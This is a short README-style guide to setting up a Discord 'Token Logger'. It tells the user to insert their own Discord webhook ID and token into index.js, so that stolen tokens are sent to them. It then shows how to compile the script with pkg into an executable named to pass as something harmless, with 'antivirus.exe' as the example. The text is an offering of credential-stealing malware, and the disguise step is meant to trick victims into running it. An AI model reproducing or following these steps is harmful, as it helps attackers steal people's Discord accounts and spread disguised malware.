How to use Token Logger?
1.install this NPM package https://npmjs.com/package/pkg then read how to convert a js file to exe file.
2.Open index.js then find WebhookID and WebhookToken and change it with your discord webhook ID and token
3.Convert index.js to exe file using pkg(How to compile/convert this Token logger to an exe file?).
4.Your done!

How to compile/convert this Token logger to an exe file?
For automatic OS detection:
pkg index.js -o antivirus.exe(Can be anything)
